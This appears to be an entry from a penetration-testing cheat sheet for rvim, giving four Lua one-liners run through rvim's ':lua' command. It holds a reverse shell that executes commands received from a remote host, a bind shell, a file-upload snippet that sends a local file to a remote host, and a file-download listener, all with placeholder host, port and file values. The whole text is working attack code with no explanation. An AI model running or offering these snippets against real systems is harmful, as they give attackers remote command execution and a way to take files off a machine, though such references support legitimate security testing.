non-interactive-reverse-shell.code:
rvim -c ':lua local s=require("socket"); local t=assert(s.tcp());
  t:connect("[host]",[port]);
  while true do
    local r,x=t:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));t:send(b);
  end;
  f:close();t:close();'

non-interactive-bind-shell.code:
rvim -c ':lua local k=require("socket");
  local s=assert(k.bind("*",[port]));
  local c=s:accept();
  while true do
    local r,x=c:receive();local f=assert(io.popen(r,"r"));
    local b=assert(f:read("*a"));c:send(b);
  end;c:close();f:close();'

file-upload.code:
rvim -c ':lua local f=io.open("[file]", 'rb')
  local d=f:read("*a")
  io.close(f);
  local s=require("socket");
  local t=assert(s.tcp());
  t:connect("[host]",[port]);
  t:send(d);
  t:close();'

file-download.code:
rvim -c ':lua local k=require("socket");
  local s=assert(k.bind("*","[port]"));
  local c=s:accept();
  local d,x=c:receive("*a");
  c:close();
  local f=io.open("[file]", "wb");
  f:write(d);
  io.close(f);'
